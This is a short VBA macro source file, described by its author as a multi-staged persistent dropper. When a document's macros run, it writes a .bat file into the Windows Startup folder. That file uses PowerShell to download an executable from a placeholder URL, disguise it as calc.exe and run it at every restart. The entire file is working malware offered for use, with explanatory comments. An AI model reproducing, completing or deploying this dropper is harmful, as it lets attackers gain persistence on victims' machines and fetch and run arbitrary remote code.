'Author: Shaddy43
'Designation: Cyber Security Engineer, reverse engineer and malware developer

'This is a vba script that acts as a multi-staged persistent dropper.
'When the macros are enabled in the document, a text file will be created in the startup folder.
'However, that text file will have an extension of .bat making it executable whenever a system restarts.
'So i wrote a cmd to download and execute malware on the system in that file and whenever system restarts, it will download and execute malware.


Sub Document_open()

    Dim FSO As Object
    Set FSO = CreateObject("Scripting.FileSystemObject")
    Dim TextFile As Object
    
    Set TextFile = FSO.CreateTextFile("C:\users\" + GetUserName() + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\cms.bat")
    TextFile.Write "powershell.exe ""wget DROPPER_URL_HERE"" -o $env:UserProfile\Downloads\calc.exe; C:\users\%USERNAME%\Downloads\calc.exe"
    

End Sub

Function GetUserName() As String
    GetUserName = Environ$("username")
    'or
    'GetUserName = Application.UserName
End Function